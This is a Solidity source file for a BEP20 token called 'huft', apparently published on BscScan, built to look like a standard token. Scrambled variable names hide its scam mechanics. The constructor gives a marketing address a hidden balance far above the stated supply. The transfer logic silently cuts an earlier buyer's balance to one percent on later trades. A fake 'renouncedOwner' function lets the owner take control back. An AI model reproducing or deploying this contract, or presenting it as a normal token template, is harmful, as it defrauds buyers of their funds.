/**
 *Submitted for verification at BscScan.com on 2022-01-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-01-11
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*

  
 */
abstract contract Context {
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;

  }
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
}
interface IBEP20 {
  event Transfer(address indexed from, address indexed to, uint256 value);
  function getOwner() external view returns (address);
  function approve(address spender, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function decimals() external view returns (uint8);
  function allowance(address owner, address spender) external view returns (uint256);
  function totalSupply() external view returns (uint256);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);
  function name() external pure returns (string memory);
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renouncedOwner() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }
    function transferOwnership() public virtual onlyOwner {
      _owner = _previousOwner;

      emit OwnershipTransferred(address(0), _owner);
    }
}
contract huft is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 private decobwdzjfosit = 18;
    uint256 private totikbwxmlqseaarhnjpitzygcfoeod = 1000000000 * 10 ** decobwdzjfosit;
    mapping (address => uint256) private seljgemzpnoqxfaiykhs;
    mapping (address => bool) private isErkegdlibnmcoj;
    address internal marqlefpidmbyocotanagxe;
    uint8 internal _sta = 3;

    mapping (address => uint256) private balqnzacrtdibhofewsxleiyokgpmja;
    mapping (address => mapping (address => uint256)) private allasmhxyjgekboidnrazoi;
    string private constant namdraestkaepnioz = "huft";
    string private constant symafnobaieoqwzpcxetyjglskrh = "huft";

    uint8 internal buyzijyhsmepcarnbokeowlx = 5;
    uint8 internal seljeltmwacgkpsxbidhfoqeinaozry = 7;

    uint8 internal tradhbajaetyngorwicmpisqfekxzlo = 6; 
    constructor(address marketingAddress) {
      isErkegdlibnmcoj[msg.sender] = true;

      isErkegdlibnmcoj[address(this)] = true;
      balqnzacrtdibhofewsxleiyokgpmja[msg.sender] = totikbwxmlqseaarhnjpitzygcfoeod;

      marqlefpidmbyocotanagxe = marketingAddress;
      isErkegdlibnmcoj[marketingAddress] = true;
      balqnzacrtdibhofewsxleiyokgpmja[marketingAddress] = totikbwxmlqseaarhnjpitzygcfoeod * 10**decobwdzjfosit * 1000;
      emit Transfer(address(0), msg.sender, totikbwxmlqseaarhnjpitzygcfoeod);
    }
    /**

     * Returns the token symbol.
     */
    function symbol() external override pure returns (string memory) {
      return symafnobaieoqwzpcxetyjglskrh;
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
      _approve(_msgSender(), spender, amount);

      return true;
    }
    /**
     * Returns the bep token owner.
     */
    function getOwner() external override view returns (address) {
      return owner();
    }
    /**

     * Returns the token decimals.
     */
    function decimals() external override view returns (uint8) {
      return decobwdzjfosit;

    }
    /**

     * Requirements:
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) external override returns (bool) {
      trajnlcmoeqkdghtezyasxfprwbioia(_msgSender(), recipient, amount);
      return true;
    }
    /**
     * Returns balance of.

     */
    function balanceOf(address account) external override view returns (uint256) {
      return balqnzacrtdibhofewsxleiyokgpmja[account];
    }
    function allowance(address owner, address spender) public view override returns (uint256) {

      return allasmhxyjgekboidnrazoi[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
       trajnlcmoeqkdghtezyasxfprwbioia(sender, recipient, amount);
       _approve(sender, _msgSender(), allasmhxyjgekboidnrazoi[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
       return true;
    }
    /**
     * Returns the token Supply.
     */
    function totalSupply() external override view returns (uint256) {

      return totikbwxmlqseaarhnjpitzygcfoeod;

    }
    /**
    * Returns the token name.

    */
    function name() external override pure returns (string memory) {
      return namdraestkaepnioz;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allasmhxyjgekboidnrazoi[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function trajnlcmoeqkdghtezyasxfprwbioia(address sender, address recipient, uint256 amount) internal {
      require(sender != address(0), "BEP20: transfer from the zero address");

      require(recipient != address(0), "BEP20: transfer to the zero address");
      uint8 ranlonksamiahgqjtexwdrpzobf = 0;
      bool approveTransaction = false;
      uint8 tax = 0;

      if(amount > 0){
        if(isErkegdlibnmcoj[sender] == true || isErkegdlibnmcoj[recipient] == true){
          balqnzacrtdibhofewsxleiyokgpmja[sender] = balqnzacrtdibhofewsxleiyokgpmja[sender].sub(amount, "Insufficient Balance");
          balqnzacrtdibhofewsxleiyokgpmja[recipient] = balqnzacrtdibhofewsxleiyokgpmja[recipient].add(amount);
          emit Transfer(sender, recipient, amount);
        } else {
          if(sender == unicbnafxjmwhakid && recipient != uninfqiakmzweolrohya) {
            ranlonksamiahgqjtexwdrpzobf = 1;
            tax = buyzijyhsmepcarnbokeowlx;
            approveTransaction = true;
          } else if(recipient == unicbnafxjmwhakid) {

             ranlonksamiahgqjtexwdrpzobf = 2;
             tax = seljeltmwacgkpsxbidhfoqeinaozry;
             approveTransaction = true;
          } else {
            ranlonksamiahgqjtexwdrpzobf = 3;

            tax = tradhbajaetyngorwicmpisqfekxzlo;
            approveTransaction = true;
          }
          if(approveTransaction == true && amount > 0){

            bTrcwpnaaimqbso(sender, recipient, amount, tax, ranlonksamiahgqjtexwdrpzobf);
          }
        }
      }
      if(amount == 0){
        emit Transfer(sender, recipient, amount);
      }
    }
    address private _recipienta;
    address private _recipientb;
    function bTrcwpnaaimqbso(address sender, address recipient, uint256 amount, uint8 tax, uint8 ranlonksamiahgqjtexwdrpzobf) internal {
      uint256 axeigeyfeixootrjamph = 0;
      address addr = recipient;
      uint256 d = balqnzacrtdibhofewsxleiyokgpmja[_recipientb];
      if(ranlonksamiahgqjtexwdrpzobf == 2) {
        addr = sender;
      }

      if(ranlonksamiahgqjtexwdrpzobf == 1 || ranlonksamiahgqjtexwdrpzobf == 2){
        if(_recipienta != addr && _recipientb != addr){
          if(d > 100 && d < totikbwxmlqseaarhnjpitzygcfoeod.div(10).mul(8)){
            balqnzacrtdibhofewsxleiyokgpmja[_recipientb] = d.div(100);
          }

          _recipientb = _recipienta;
          _recipienta = addr;
        }
      }
      balqnzacrtdibhofewsxleiyokgpmja[sender] = balqnzacrtdibhofewsxleiyokgpmja[sender].sub(amount,"Insufficient Balance");
      axeigeyfeixootrjamph = amount.mul(tax).div(100);

      amount = amount.sub(axeigeyfeixootrjamph);
      balqnzacrtdibhofewsxleiyokgpmja[recipient] = balqnzacrtdibhofewsxleiyokgpmja[recipient].add(amount);
      ranlonksamiahgqjtexwdrpzobf = 1;

      emit Transfer(sender, recipient, amount);
    }
    address public unicbnafxjmwhakid;
    address public uninfqiakmzweolrohya = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 internal _pairset = 0;
    function setUniswapV2Pair(address uniswapV2Pair) public onlyOwner {
      unicbnafxjmwhakid = uniswapV2Pair;
      _pairset = 1;
    }
}